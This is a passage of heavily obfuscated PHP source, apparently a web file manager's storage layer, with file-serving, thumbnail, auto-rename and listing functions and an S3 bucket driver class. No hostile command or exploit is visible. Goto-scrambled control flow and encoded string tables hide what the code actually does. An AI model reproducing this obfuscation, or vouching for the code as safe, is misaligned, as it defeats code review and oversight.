== $b¼ˆ›†›[106]; $D‹±ó™Ì¬¤ = $GLOBALS[$b¼ˆ›†›[6]][$b¼ˆ›†›[88]][$b¼ˆ›†›[107]][$b¼ˆ›†›[108]]; $DéìÓ»î°ù = (double) $GLOBALS[$b¼ˆ›†›[6]][$b¼ˆ›†›[88]][$b¼ˆ›†›[107]][$b¼ˆ›†›[109]] * 1024 * 1024; goto cÔÂ§ÒÒ™Ç; aµÂÛ¨: } public function fileOutServer($f¾Íï¢¯Ğ«, $Cœ˜áß­§ø = false, $Dï‰‘¡î‚„ = false, $Bğ ™åŠç = '') { $this->fileOut($f¾Íï¢¯Ğ«, $Cœ˜áß­§ø, $Dï‰‘¡î‚„, $Bğ ™åŠç); } public function fileOutLink($a ¼¾ó±½¾) { header($_SERVER[Šº][159] . $a ¼¾ó±½¾); die; } public function cacheMethod($e½¹ÜÚ½“õ, $Dïâ•µÒÛ, $cØãğˆ©İ¦ = null) { goto f´À«Œë°Ú; a¦Ìï¿ñ¯ê: $e®ÌÅ¹Ââ° = $F¦Ü‚¡“‚ª[160] . $e½¹ÜÚ½“õ . $F¦Ü‚¡“‚ª[161] . rtrim($Bå§öŒèˆ, $F¦Ü‚¡“‚ª[8]); if (is_null($e½¹ÜÚ½“õ)) { $fÌ¸—‚Õ¾† = array(); return; } if (is_null($Dïâ•µÒÛ)) { unset($fÌ¸—‚Õ¾†[$e®ÌÅ¹Ââ°]); return; } goto aŸšÊ¶ïˆ†; f´À«Œë°Ú: $F¦Ü‚¡“‚ª =& $_SERVER[Šº]; static $fÌ¸—‚Õ¾† = array(); $Bå§öŒèˆ = $Dïâ•µÒÛ ? ltrim($this->getPathOuter($Dïâ•µÒÛ), $F¦Ü‚¡“‚ª[8]) : $Dïâ•µÒÛ; goto a¦Ìï¿ñ¯ê; aŸšÊ¶ïˆ†: if (!is_null($cØãğˆ©İ¦)) { $fÌ¸—‚Õ¾†[$e®ÌÅ¹Ââ°] = $cØãğˆ©İ¦; return; } $b¼ÖÊÑËåœ = isset($fÌ¸—‚Õ¾†[$e®ÌÅ¹Ââ°]) ? $fÌ¸—‚Õ¾†[$e®ÌÅ¹Ââ°] : null; if (!is_null($b¼ÖÊÑËåœ)) { return $b¼ÖÊÑËåœ; } goto EØ‰Öçã”; EØ‰Öçã”: $b¼ÖÊÑËåœ = $this->{$e½¹ÜÚ½“õ}($Dïâ•µÒÛ); $fÌ¸—‚Õ¾†[$e®ÌÅ¹Ââ°] = $b¼ÖÊÑËåœ; return $b¼ÖÊÑËåœ; goto e†„—°ÉËÃ; e†„—°ÉËÃ: } public function fileOutImage($EÚ‹ŞµŸíø, $Aô¶·×—š÷ = 250) { goto bâ×—Ğ¼àğ; D÷®õ‰ò°: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $Ağæ‚ì®·ó = DATA_THUMB . $A•†‚Ô·È; del_file($Ağæ‚ì®·ó); goto fƒ†‡§œ†; E’¶Ê“¸–…: $A•†‚Ô·È = "{$D¾Ô‚ ø¤}\x5f{$Aô¶·×—š÷}\56\x70\156\147"; if (!($EĞ•¬ŞÆÕ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $E‹Õµ×¾£[172]))) { $C°Ò†ë†ùï = IO::mkdir(IO_PATH_SYSTEM_TEMP . $E‹Õµ×¾£[173]); } else { $C°Ò†ë†ùï = KodIO::make($EĞ•¬ŞÆÕ); } if ($EĞ•¬ŞÆÕ = IO::fileNameExist($C°Ò†ë†ùï, $A•†‚Ô·È)) { $Ağæ‚ì®·ó = KodIO::make($EĞ•¬ŞÆÕ); return IO::fileOut($Ağæ‚ì®·ó, !1, $dßï‹©·ïÊ); } goto D÷®õ‰ò°; Fˆ¡àğæºÑ: $b°ÙÄ§£Õ­ = $this->info($EÚ‹ŞµŸíø); $dßï‹©·ïÊ = $b°ÙÄ§£Õ­[$E‹Õµ×¾£[28]]; $E‰†»³ˆöø = !1; goto dÕ‚’®ä†; dÕ‚’®ä†: if (isset($GLOBALS[$E‹Õµ×¾£[162]]) && $GLOBALS[$E‹Õµ×¾£[162]][$E‹Õµ×¾£[76]] == $b°ÙÄ§£Õ­[$E‹Õµ×¾£[76]]) { $dº£½å†‹ = $GLOBALS[$E‹Õµ×¾£[162]][$E‹Õµ×¾£[163]]; if (!$b°ÙÄ§£Õ­[$E‹Õµ×¾£[164]]) { $b°ÙÄ§£Õ­[$E‹Õµ×¾£[164]] = $GLOBALS[$E‹Õµ×¾£[162]]; } if (isset($dº£½å†‹[$E‹Õµ×¾£[165]])) { if ($dº£½å†‹[$E‹Õµ×¾£[165]] <= $Aô¶·×—š÷ && $dº£½å†‹[$E‹Õµ×¾£[166]] <= $Aô¶·×—š÷) { $E‰†»³ˆöø = !0; } } $dßï‹©·ïÊ = $b°ÙÄ§£Õ­[$E‹Õµ×¾£[164]][$E‹Õµ×¾£[28]]; } if ($b°ÙÄ§£Õ­[$E‹Õµ×¾£[78]] <= 1024 * 50 || $E‰†»³ˆöø || !function_exists($E‹Õµ×¾£[167]) || $b°ÙÄ§£Õ­[$E‹Õµ×¾£[168]] == $E‹Õµ×¾£[169]) { return $this->fileOut($EÚ‹ŞµŸíø, !1, $dßï‹©·ïÊ); } if (isset($b°ÙÄ§£Õ­[$E‹Õµ×¾£[164]][$E‹Õµ×¾£[170]])) { $D¾Ô‚ ø¤ = $b°ÙÄ§£Õ­[$E‹Õµ×¾£[164]][$E‹Õµ×¾£[170]]; } else { if (isset($b°ÙÄ§£Õ­[$E‹Õµ×¾£[164]][$E‹Õµ×¾£[171]])) { $D¾Ô‚ ø¤ = $b°ÙÄ§£Õ­[$E‹Õµ×¾£[164]][$E‹Õµ×¾£[171]]; } else { $D¾Ô‚ ø¤ = md5("{$b°ÙÄ§£Õ­[$E‹Õµ×¾£[28]]}\137{$b°ÙÄ§£Õ­[$E‹Õµ×¾£[76]]}\137{$b°ÙÄ§£Õ­[$E‹Õµ×¾£[78]]}"); } } goto E’¶Ê“¸–…; bâ×—Ğ¼àğ: $E‹Õµ×¾£ =& $_SERVER[Šº]; set_timeout(); if (substr($EÚ‹ŞµŸíø, 0, 4) == $E‹Õµ×¾£[147]) { $this->fileOutLink($EÚ‹ŞµŸíø); } goto Fˆ¡àğæºÑ; fƒ†‡§œ†: if (!@file_exists($Ağæ‚ì®·ó)) { $f ùªØøÔ = TEMP_FILES; if (!is_dir($f ùªØøÔ)) { mk_dir($f ùªØøÔ); } $F¢°²¯„í¢ = $f ùªØøÔ . $D¾Ô‚ ø¤ . $E‹Õµ×¾£[95] . $b°ÙÄ§£Õ­[$E‹Õµ×¾£[168]]; if (!@file_exists($F¢°²¯„í¢)) { $F¢°²¯„í¢ = $this->download($EÚ‹ŞµŸíø, $F¢°²¯„í¢); } ImageThumb::createThumb($F¢°²¯„í¢, $Ağæ‚ì®·ó, $Aô¶·×—š÷, $Aô¶·×—š÷ * 10); } if (!file_exists($Ağæ‚ì®·ó) || filesize($Ağæ‚ì®·ó) < 100) { return @file_exists($F¢°²¯„í¢) ? IO::fileOut($F¢°²¯„í¢) : $this->fileOut($EÚ‹ŞµŸíø); } if (!($f”¶Éò ê = IO::move($Ağæ‚ì®·ó, $C°Ò†ë†ùï))) { return IO::fileOut($Ağæ‚ì®·ó); } goto b‡İ÷çùêœ; b‡İ÷çùêœ: del_file($Ağæ‚ì®·ó); IO::fileOut($f”¶Éò ê); goto cÜ¡òàË¼; cÜ¡òàË¼: } public function fileOutImageServer($D¯·İ’ìÉ, $cÃ ¹Ñë³ = 250) { $this->fileOutImage($D¯·İ’ìÉ, $cÃ ¹Ñë³); } public function fileNameAuto($d™¤‘·ç, $dŠÌ ª‘¶, $B£¤óƒ‚¨ = REPEAT_RENAME, $a¤ö‚öÂÖø = false) { goto AÁñõÚĞ®Ü; eÜ•òá¸Â: if ($B£¤óƒ‚¨ == REPEAT_SKIP) { return !1; } $F·éÁĞ‡íñ = $bâš°ÜÈƒã[95] . get_path_ext($dŠÌ ª‘¶); $F·éÁĞ‡íñ = $F·éÁĞ‡íñ == $bâš°ÜÈƒã[95] || $a¤ö‚öÂÖø ? $bâš°ÜÈƒã[33] : $F·éÁĞ‡íñ; goto fŠ©…È¢â; AÁñõÚĞ®Ü: $bâš°ÜÈƒã =& $_SERVER[Šº]; $FÊì¸²¿²™ = $d™¤‘·ç === $bâš°ÜÈƒã[33] ? $dŠÌ ª‘¶ : rtrim($d™¤‘·ç, $bâš°ÜÈƒã[8]) . $bâš°ÜÈƒã[8] . $dŠÌ ª‘¶; if ($B£¤óƒ‚¨ == REPEAT_REPLACE || !$this->exist($FÊì¸²¿²™) || $a¤ö‚öÂÖø && $B£¤óƒ‚¨ != REPEAT_RENAME_FOLDER) { return $dŠÌ ª‘¶; } goto eÜ•òá¸Â; fŠ©…È¢â: $f²Ù¥§¢ã­ = 1; $D“Ù ª•çç = substr($dŠÌ ª‘¶, 0, strlen($dŠÌ ª‘¶) - strlen($F·éÁĞ‡íñ)); $A›”Ç…¿‡ß = $D“Ù ª•çç . "\x28{$f²Ù¥§¢ã­}\x29{$F·éÁĞ‡íñ}"; goto eö…Ó”Ï¨; eö…Ó”Ï¨: while ($this->exist(rtrim($d™¤‘·ç, $bâš°ÜÈƒã[8]) . $bâš°ÜÈƒã[8] . $A›”Ç…¿‡ß)) { $A›”Ç…¿‡ß = $D“Ù ª•çç . "\x28{$f²Ù¥§¢ã­}\51{$F·éÁĞ‡íñ}"; $f²Ù¥§¢ã­++; } return $A›”Ç…¿‡ß; goto bÑäŒÊ„; bÑäŒÊ„: } private function fileNameAutoList($e¿í¢ÖïÑ›, $dµİ™Æ½ğ¨, $B†ášœÏ¶ = false) { goto cÙÚì†¾Š; cÙÚì†¾Š: $Bï‰É†¢ =& $_SERVER[Šº]; $DïãÇ…Ÿè = $this->listPath($e¿í¢ÖïÑ›, !0); $DïãÇ…Ÿè = array_merge($DïãÇ…Ÿè[$Bï‰É†¢[75]], $DïãÇ…Ÿè[$Bï‰É†¢[74]]); goto fÈ³ö×Ìò; fÈ³ö×Ìò: $d‡¬˜Åå½ƒ = array_to_keyvalue($DïãÇ…Ÿè, $Bï‰É†¢[33], $Bï‰É†¢[28]); $DÆ«×–‚Ã’ = $Bï‰É†¢[95] . get_path_ext($dµİ™Æ½ğ¨); $DÆ«×–‚Ã’ = $DÆ«×–‚Ã’ == $Bï‰É†¢[95] || $B†ášœÏ¶ ? $Bï‰É†¢[33] : $DÆ«×–‚Ã’; goto BäÄíöÅº; BäÄíöÅº: $B©öñ“á’â = substr($dµİ™Æ½ğ¨, 0, strlen($dµİ™Æ½ğ¨) - strlen($DÆ«×–‚Ã’)); $FãÉó¾…âè = $B©öñ“á’â . "\50\x30\x29{$DÆ«×–‚Ã’}"; for ($a…¾¢åô×ë = 1; $a…¾¢åô×ë <= count($d‡¬˜Åå½ƒ) + 1; $a…¾¢åô×ë++) { $FãÉó¾…âè = $B©öñ“á’â . "\50{$a…¾¢åô×ë}\x29{$DÆ«×–‚Ã’}"; if (!in_array_not_case($FãÉó¾…âè, $d‡¬˜Åå½ƒ)) { return $FãÉó¾…âè; } } goto CŠ‹ª–ÙÑ‚; CŠ‹ª–ÙÑ‚: return $FãÉó¾…âè; goto EÍİ¦êÅ; EÍİ¦êÅ: } public function listAllFiles($c¢†¬Áà®, $Bğí¹‰éÔ…, $eÜÙèßŞ½ = array()) { goto BÍß—³òòæ; eÀˆ¿ã©‹Ğ: foreach (array_unique($Dó§÷˜İ) as $Dš½õòĞ¸) { $d†©„¬»„‘ = array($c Í¦Ş³‰è[76] => $this->getPathOuter($c Í¦Ş³‰è[8] . $c¢†¬Áà® . $c Í¦Ş³‰è[8] . $Dš½õòĞ¸), $c Í¦Ş³‰è[77] => 1, $c Í¦Ş³‰è[78] => 0); if (substr($Dš½õòĞ¸, -1) != $c Í¦Ş³‰è[8]) { $d†©„¬»„‘[$c Í¦Ş³‰è[77]] = 0; $aëã¥­ğœÇ = $this->getPath($c¢†¬Áà® . $c Í¦Ş³‰è[8] . $Dš½õòĞ¸); $d†©„¬»„‘[$c Í¦Ş³‰è[78]] = isset($eÜÙèßŞ½[$aëã¥­ğœÇ]) ? $eÜÙèßŞ½[$aëã¥­ğœÇ] : $this->size($aëã¥­ğœÇ); } $d¦‹§åº’‘[] = $d†©„¬»„‘; } return $d¦‹§åº’‘; goto eà¤Ğá¯Ä£; BÍß—³òòæ: $c Í¦Ş³‰è =& $_SERVER[Šº]; if (empty($Bğí¹‰éÔ…)) { return array(); } $Dó§÷˜İ = array(); goto d‹ÜîŒ‰›‚; d‹ÜîŒ‰›‚: $c¢†¬Áà® = trim($c¢†¬Áà®, $c Í¦Ş³‰è[8]); foreach ($Bğí¹‰éÔ… as $Dš½õòĞ¸) { $aàá‰Åİé = ltrim(substr(trim($Dš½õòĞ¸, $c Í¦Ş³‰è[8]), strlen($c¢†¬Áà®)), $c Í¦Ş³‰è[8]); $Dó§÷˜İ = array_merge($Dó§÷˜İ, $this->slicePath($aàá‰Åİé)); } $d¦‹§åº’‘ = array(); goto eÀˆ¿ã©‹Ğ; eà¤Ğá¯Ä£: } public function slicePath($aé‡Îçõ÷¨) { $A£²°å·Ò =& $_SERVER[Šº]; $bìà¡ğ¡ = explode($A£²°å·Ò[8], trim($aé‡Îçõ÷¨, $A£²°å·Ò[8])); $f“Ãåá½– = 0; do { ++$f“Ãåá½–; $A‚Š–ŒÅÍÍ[] = implode($A£²°å·Ò[8], array_slice($bìà¡ğ¡, 0, $f“Ãåá½–)) . $A£²°å·Ò[8]; } while ($f“Ãåá½– < count($bìà¡ğ¡)); $A‚Š–ŒÅÍÍ[count($bìà¡ğ¡) - 1] = $aé‡Îçõ÷¨; return $A‚Š–ŒÅÍÍ; } public function getHost() { $a”íå…è”Ò =& $_SERVER[Šº]; $bğñ¯¤Ñ„ä = parse_url(trim($this->domain, $a”íå…è”Ò[8])); $B¨†çŒ÷ª = isset($bğñ¯¤Ñ„ä[$a”íå…è”Ò[174]]) ? $bğñ¯¤Ñ„ä[$a”íå…è”Ò[174]] : http_type(); $FÅÖÙè¹‘‚ = isset($bğñ¯¤Ñ„ä[$a”íå…è”Ò[175]]) ? $bğñ¯¤Ñ„ä[$a”íå…è”Ò[175]] : $bğñ¯¤Ñ„ä[$a”íå…è”Ò[76]]; if (isset($bğñ¯¤Ñ„ä[$a”íå…è”Ò[176]])) { $FÅÖÙè¹‘‚ .= $a”íå…è”Ò[4] . $bğñ¯¤Ñ„ä[$a”íå…è”Ò[176]]; } return $B¨†çŒ÷ª . $a”íå…è”Ò[177] . $FÅÖÙè¹‘‚; } public function pathEncode($B¹îñĞ) { $C¹´Ï—ÂÀğ =& $_SERVER[Šº]; return str_replace($C¹´Ï—ÂÀğ[178], $C¹´Ï—ÂÀğ[8], rawurlencode($B¹îñĞ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($aè§×œ§Â) { set_timeout(); require_once SDK_DIR . $_SERVER[Šº][179]; parent::__construct(); $this->_init($aè§×œ§Â); } public function _init($a‘÷Îß„òÈ) { foreach ($a‘÷Îß„òÈ as $f¨ôÁº Ò“ => $aƒå©©É˜) { if (isset($this->{$f¨ôÁº Ò“})) { $this->{$f¨ôÁº Ò“} = $aƒå©©É˜; } } $this->endpoint = $a‘÷Îß„òÈ[$_SERVER[Šº][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($aÇõ¿„İ¥µ = "\x76\x34") { $this->signVer = $aÇõ¿„İ¥µ; $this->client->setSignatureVersion($aÇõ¿„İ¥µ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto e¿î™‚Ñ÷; B¾Ñ•á«”: $C´§ºˆóòˆ = array($a¬‡–É±Û±[186], $a¬‡–É±Û±[187], $a¬‡–É±Û±[188], $a¬‡–É±Û±[189], $a¬‡–É±Û±[190]); $b‡ôÏŞŞš = array_diff($C´§ºˆóòˆ, $B­‚Ã·ËÆ); return empty($b‡ôÏŞŞš); goto dÂÇ³òß„Ø; e ß¿Œ¡ñš: if ($BĞ¾µœˆµ«[$a¬‡–É±Û±[181]] != $a¬‡–É±Û±[182] || $BĞ¾µœˆµ«[$a¬‡–É±Û±[183]] != $a¬‡–É±Û±[182]) { return !1; } $B­‚Ã·ËÆ = array_map($a¬‡–É±Û±[184], $BĞ¾µœˆµ«[$a¬‡–É±Û±[185]]); if (!is_array($B­‚Ã·ËÆ)) { $B­‚Ã·ËÆ = array(); } goto B¾Ñ•á«”; e¿î™‚Ñ÷: $a¬‡–É±Û± =& $_SERVER[Šº]; $BĞ¾µœˆµ« = $this->getBucketCors(); if (!$BĞ¾µœˆµ« || !is_array($BĞ¾µœˆµ«)) { return !1; } goto e ß¿Œ¡ñš; dÂÇ³òß„Ø: } public function mkfile($cÀ´Ğ†Ç‘, $f‹¿ÚÏ‡Ù¾ = '', $b›Ú„¾ˆ = REPEAT_RENAME) { $cïŠ–Ñ¼ó = $this->setContent($cÀ´Ğ†Ç‘, $f‹¿ÚÏ‡Ù¾); if ($cïŠ–Ñ¼ó !== !1) { return $this->getPathOuter($cÀ´Ğ†Ç‘); } return !1; } public function mkdir($A®“™­‘ì¹, $f°ì¹¥Ùî = REPEAT_SKIP) { if (empty($A®“™­‘ì¹)) { return !1; } if ($this->_isFolder($A®“™­‘ì¹)) { return $this->getPathOuter($A®“™­‘ì¹); } $CìŞô¤®§Í = $this->setContent($A®“™­‘ì¹, $_SERVER[Šº][33], !0); if ($CìŞô¤®§Í !== !1) { return $this->getPathOuter($A®“™­‘ì¹); } return !1; } public function copyFile($Bã¤ÙÌ®¦, $bÅ»©å‹Ú¼, $e’èòåÀ‚“ = array()) { $cõïíîâ† =& $_SERVER[Šº]; $dê†ˆ–×¤ = $this->objectMeta($Bã¤ÙÌ®¦); if (!$dê†ˆ–×¤) { return !1; } if ($dê†ˆ–×¤[$cõïíîâ†[78]] <= 1024 * 1024 * 200) { $eõøäÂ©­‚ = $this->client->copyObject($this->bucket, $Bã¤ÙÌ®¦, $this->bucket, $bÅ»©å‹Ú¼, $cõïíîâ†[191], $e’èòåÀ‚“); } else { $eõøäÂ©­‚ = $this->client->multiCopyObject($this->bucket, $Bã¤ÙÌ®¦, $this->bucket, $bÅ»©å‹Ú¼, $e’èòåÀ‚“); } $eõøäÂ©­‚ = $eõøäÂ©­‚ ? $this->getPathOuter($bÅ»©å‹Ú¼) : !1; return $eõøäÂ©­‚; } public function moveFile($DŒÀå¤á, $f©Æ‚øÊ­) { if ($this->copyFile($DŒÀå¤á, $f©Æ‚øÊ­)) { $this->delFile($DŒÀå¤á); return $this->getPathOuter($f©Æ‚øÊ­); } return !1; } public function delFile($DâÜ»š·ï) { return $this->client->deleteObject($this->bucket, $DâÜ»š·ï); } public function delFolder($cŸíĞªÅ†) { goto Aƒ–øŒƒ´ì; E¸óƒ‡ÂÉ¾: if (!empty($cŸíĞªÅ†) && !in_array($E£œ‹½¶ ¦, $Dˆ¡­ÇÁŸ’[$EµÖéÖÂËÆ[75]])) { $Dˆ¡­ÇÁŸ’[$EµÖéÖÂËÆ[75]][] = $E£œ‹½¶ ¦; } $BÔò•õˆÏ• = $this->delByBatch($Dˆ¡­ÇÁŸ’[$EµÖéÖÂËÆ[74]]); if (!$BÔò•õˆÏ•) { return !1; } goto E–¡Œ½“ôÃ; E–¡Œ½“ôÃ: return $this->delByBatch($Dˆ¡­ÇÁŸ’[$EµÖéÖÂËÆ[75]]); goto DÚğİÂ‰‡¼; Aƒ–øŒƒ´ì: $EµÖéÖÂËÆ =& $_SERVER[Šº]; if (!$this->exist($cŸíĞªÅ†)) { return !0; } $this->listItemCache = !1; goto fóë·Âä¡¥; fóë·Âä¡¥: $Dˆ¡­ÇÁŸ’ = $this->fileList($cŸíĞªÅ†); $this->listItemCache = !0; $E£œ‹½¶ ¦ = trim($cŸíĞªÅ†, $EµÖéÖÂËÆ[8]) . $EµÖéÖÂËÆ[8]; goto E¸óƒ‡ÂÉ¾; DÚğİÂ‰‡¼: } private function delByBatch($fŒ†ÂÊ“Á) { foreach (array_chunk($fŒ†ÂÊ“Á, 1000) as $E×ÀÄà²¥¶) { $BÒÔºø¸ë = $this->client->deleteObjects($this->bucket, $E×ÀÄà²¥¶); if (!$BÒÔºø¸ë) { return !1; } } return !0; } public function rename($aÑ ÄÆ‘£, $f×œ½³) { return $this->renameObject($aÑ ÄÆ‘£, $f×œ½³); } public function listPath($C†Ï¸£“Öù, $dĞöØÍ­…© = false) { $Fåö ±§ò =& $_SERVER[Šº]; $AÅñ¼øİÍ = $this->fileList($C†Ï¸£“Öù, $Fåö ±§ò[8], !0); foreach ($AÅñ¼øİÍ[$Fåö ±§ò[75]] as $AØğëÛ«Ô => $B‹Øë°»ºé) { $AÅñ¼øİÍ[$Fåö ±§ò[75]][$AØğëÛ«Ô] = $this->folderInfo($B‹Øë°»ºé, $dĞöØÍ­…©); } foreach ($AÅñ¼øİÍ[$Fåö ±§ò[74]] as $AØğëÛ«Ô => $B‹Øë°»ºé) { $AÅñ¼øİÍ[$Fåö ±§ò[74]][$AØğëÛ«Ô] = $this->fileInfo($B‹Øë°»ºé[$Fåö ±§ò[28]], $dĞöØÍ­…©, $B‹Øë°»ºé); } return $AÅñ¼øİÍ; } private function fileInfo($Fö¸’Ì¯Óî, $c‹ÑéÈà™ = false, $d‚Ö³Â¡ğ  = array()) { goto B¸ñ³µ·§ê; aóïÉÎğ: $eÑõ¿‰ç’[$D…†ˆÛÍÔô[193]] = $eÑõ¿‰ç’[$D…†ˆÛÍÔô[84]] = 0; $eÑõ¿‰ç’[$D…†ˆÛÍÔô[194]] = $eÑõ¿‰ç’[$D…†ˆÛÍÔô[195]] = !0; if (empty($d‚Ö³Â¡ğ )) { $d‚Ö³Â¡ğ  = $this->objectMeta($Fö¸’Ì¯Óî); if (!$d‚Ö³Â¡ğ ) { return $eÑõ¿‰ç’; } } goto A®®õƒÍ¹È; B¸ñ³µ·§ê: $D…†ˆÛÍÔô =& $_SERVER[Šº]; $eÑõ¿‰ç’ = array($D…†ˆÛÍÔô[28] => $this->pathThis($Fö¸’Ì¯Óî), $D…†ˆÛÍÔô[76] => $this->getPathOuter($Fö¸’Ì¯Óî), $D…†ˆÛÍÔô[29] => $D…†ˆÛÍÔô[192], $D…†ˆÛÍÔô[168] => $this->ext($Fö¸’Ì¯Óî), $D…†ˆÛÍÔô[78] => isset($d‚Ö³Â¡ğ [$D…†ˆÛÍÔô[78]]) ? $d‚Ö³Â¡ğ [$D…†ˆÛÍÔô[78]] : 0); if ($c‹ÑéÈà™) { return $eÑõ¿‰ç’; } goto aóïÉÎğ; A®®õƒÍ¹È: if (isset($d‚Ö³Â¡ğ [$D…†ˆÛÍÔô[196]])) { $eÑõ¿‰ç’[$D…†ˆÛÍÔô[84]] = $d‚Ö³Â¡ğ [$D…†ˆÛÍÔô[196]]; } if (isset($d‚Ö³Â¡ğ [$D…†ˆÛÍÔô[78]])) { $eÑõ¿‰ç’[$D…†ˆÛÍÔô[78]] = $d‚Ö³Â¡ğ [$D…†ˆÛÍÔô[78]]; } return $eÑõ¿‰ç’; goto bİğ‚Îò³; bİğ‚Îò³: } private function folderInfo($bÛÂôˆæÅÂ, $f¥Ş”Ã†ìò = false) { goto A¨Š¶Ú‘¨‡; A¨Š¶Ú‘¨‡: $a³¤÷£âä­ =& $_SERVER[Šº]; $Fˆ„Ñ×‘í› = array($a³¤÷£âä­[28] => $this->pathThis($bÛÂôˆæÅÂ), $a³¤÷£âä­[76] => $this->getPathOuter($a³¤÷£âä­[8] . $bÛÂôˆæÅÂ), $a³¤÷£âä­[29] => $a³¤÷£âä­[77]); if ($f¥Ş”Ã†ìò) { return $Fˆ„Ñ×‘í›; } goto A·Œ¯Ğ˜; A·Œ¯Ğ˜: $Fˆ„Ñ×‘í›[$a³¤÷£âä­[193]] = $Fˆ„Ñ×‘í›[$a³¤÷£âä­[84]] = 0; $Fˆ„Ñ×‘í›[$a³¤÷£âä­[194]] = $Fˆ„Ñ×‘í›[$a³¤÷£âä­[195]] = !0; if ($bÛÂôˆæÅÂ == $a³¤÷£âä­[33]) { return $Fˆ„Ñ×‘í›; } goto E©ºµ‡Óğõ; F•Ù„Á: return $Fˆ„Ñ×‘í›; goto aç¬º¥…‰; E©ºµ‡Óğõ: $bÛÂôˆæÅÂ = trim($bÛÂôˆæÅÂ, $a³¤÷£âä­[8]) . $a³¤÷£âä­[8]; $C†˜³›‰ğŠ = $this->objectMeta($bÛÂôˆæÅÂ); if (isset($C†˜³›‰ğŠ[$a³¤÷£âä­[196]])) { $Fˆ„Ñ×‘í›[$a³¤÷£âä­[193]] = $C†˜³›‰ğŠ[$a³¤÷£âä­[196]]; } goto F•Ù„Á; aç¬º¥…‰: } private function fileList($eä¸‡‘Ëëõ, $AßÖ»™”¨É = '', $bæÒ²×¹ê÷ = 0) { goto f˜öÒÑ™ŠÁ; D–ñí‚‘: if (!$D’¹Å“â³Š) { return array($DÏ©Ù„Í”‘[75] => array(), $DÏ©Ù„Í”‘[74] => array()); } $aÄ×ã’†§ = $this->listItemCache === !1 ? !1 : !0; $B±ë‡Ô¡ôœ = $f¬±èĞ = array(); goto eÏë–ó”«; bÔ’Û¦áÜ‚: return array($DÏ©Ù„Í”‘[75] => $B±ë‡Ô¡ôœ, $DÏ©Ù„Í”‘[74] => $f¬±èĞ); goto eÁ¼¾òóËö; eÏë–ó”«: foreach ($D’¹Å“â³Š[$DÏ©Ù„Í”‘[197]] as $EïßŒ½ÅÌ…) { goto f®ì¹êÁÄè; c‰Æ§ «Ôã: $f¬±èĞ[] = $bæÒ²×¹ê÷ ? $EïßŒ½ÅÌ… : $D¢·ë¹½§Ä; goto Eœñì¡ŸÖ”; E‚Ò¾±‹Ğ•: $e¥šó™²Û = $dÅ»ñ·ë‚í == 0 && substr($D¢·ë¹½§Ä, strlen($D¢·ë¹½§Ä) - 1, 1) == $DÏ©Ù„Í”‘[8] ? !0 : !1; if ($aÄ×ã’†§) { $this->cacheMethod($DÏ©Ù„Í”‘[198], $D¢·ë¹½§Ä, $e¥šó™²Û); $this->cacheMethod($DÏ©Ù„Í”‘[199], $D¢·ë¹½§Ä, $EïßŒ½ÅÌ…); } if ($e¥šó™²Û) { $B±ë‡Ô¡ôœ[] = $D¢·ë¹½§Ä; continue; } goto c‰Æ§ «Ôã; f®ì¹êÁÄè: $D¢·ë¹½§Ä = $EïßŒ½ÅÌ…[$DÏ©Ù„Í”‘[28]]; if ($D¢·ë¹½§Ä == $D¸Â¥‚¬šÅ) { continue; } $dÅ»ñ·ë‚í = isset($EïßŒ½ÅÌ…[$DÏ©Ù„Í”‘[78]]) ? $EïßŒ½ÅÌ…[$DÏ©Ù„Í”‘[78]] : 0; goto E‚Ò¾±‹Ğ•; Eœñì¡ŸÖ”: } foreach ($D’¹Å“â³Š[$DÏ©Ù„Í”‘[200]] as $EïßŒ½ÅÌ…) { $B±ë‡Ô¡ôœ[] = $EïßŒ½ÅÌ…[$DÏ©Ù„Í”‘[28]]; if ($aÄ×ã’†§) { $this->cacheMethod($DÏ©Ù„Í”‘[198], $EïßŒ½ÅÌ…[$DÏ©Ù„Í”‘[28]], !0); } } if ($aÄ×ã’†§) { $this->cacheMethod($DÏ©Ù„Í”‘[198], $eä¸‡‘Ëëõ, !0); } goto bÔ’Û¦áÜ‚; f˜öÒÑ™ŠÁ: $DÏ©Ù„Í”‘ =& $_SERVER[Šº]; $D¸Â¥‚¬šÅ = rtrim($eä¸‡‘Ëëõ, $DÏ©Ù„Í”‘[8]) . $DÏ©Ù„Í”‘[8]; $D’¹Å“â³Š = $this->listObjs($D¸Â¥‚¬šÅ, null, null, $AßÖ»™”¨É); goto D–ñí‚‘; eÁ¼¾òóËö: } private function listObjs($a’ÎŸ²—­‰, $a¬£ùÍ½Ñ¾ = null, $dÚšì‚í¾Ğ = null, $Eàµ­‘ÇÁ© = null) { $bğì•‹ƒ¢ =& $_SERVER[Šº]; $a’ÎŸ²—­‰ = trim($a’ÎŸ²—­‰, $bğì•‹ƒ¢[8]); $F‡ÙŸ¥»¿ = empty($a’ÎŸ²—­‰) ? $bğì•‹ƒ¢[33] : $a’ÎŸ²—­‰ . $bğì•‹ƒ¢[8]; return $this->client->getBucket($this->bucket, $F‡ÙŸ¥»¿, $a¬£ùÍ½Ñ¾, $dÚšì‚í¾Ğ, $Eàµ­‘ÇÁ©, !0); } public function has($E²ƒò°†Ã³, $D¥ˆ„Ÿ†èô = false, $FòßğÇ«‘Š = true) { goto AøõÉ÷ÂÂ; f¤»¢÷ñ“: return !1; goto a“Ÿİ©õ™‰; AŠ½àÂ½èî: $aÒ½¤‡Õ¬ = null; $EÖõâİ¼ = 500; $F™ÖƒÉ˜Ã‘ = $DŒ•È˜‚õÏ[8]; goto Cİâ”ª·Ó; AøõÉ÷ÂÂ: $DŒ•È˜‚õÏ =& $_SERVER[Šº]; $E²ƒò°†Ã³ = trim($E²ƒò°†Ã³, $DŒ•È˜‚õÏ[8]); $b‘‡ºÂäÓÏ = empty($E²ƒò°†Ã³) ? $DŒ•È˜‚õÏ[33] : $E²ƒò°†Ã³ . $DŒ•È˜‚õÏ[8]; goto AŠ½àÂ½èî; Cİâ”ª·Ó: $e§óî¥®º = $BÈÎ±À–°ó = array(); while (!0) { 